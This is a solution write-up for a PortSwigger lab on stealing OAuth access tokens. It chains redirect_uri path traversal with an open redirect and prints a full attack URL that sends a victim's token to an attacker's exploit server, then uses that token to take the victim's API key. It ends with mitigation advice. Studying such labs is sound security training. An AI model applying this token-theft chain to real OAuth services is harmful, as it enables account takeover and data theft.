# Lab 05 — Stealing OAuth access tokens via an open redirect

> **Expert** · [Official lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

**Entry point:** `redirect_uri` whitelist blocks foreign domains — but
allows `/../` traversal, and the blog has an open redirect
(`/post/next?path=`).

## Solution

1. Confirm traversal: `redirect_uri=https://LAB/oauth-callback/../post?postId=1`
   is accepted and the token arrives in the fragment.
2. Chain with the open redirect:

```
https://oauth-YOUR-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=...
```

(encode the inner `?`/`&`).

3. Deliver to victim — the fragment (`access_token=...`) is preserved
   through the client-side redirect and lands in your access log.
4. Call `GET /me` with `Authorization: Bearer <token>` → victim's API key —
   submit it — lab solved.

## Mitigation

An open redirect inside a trusted domain defeats URI allow-lists — fix both;
prefer the code flow (tokens never in fragments).
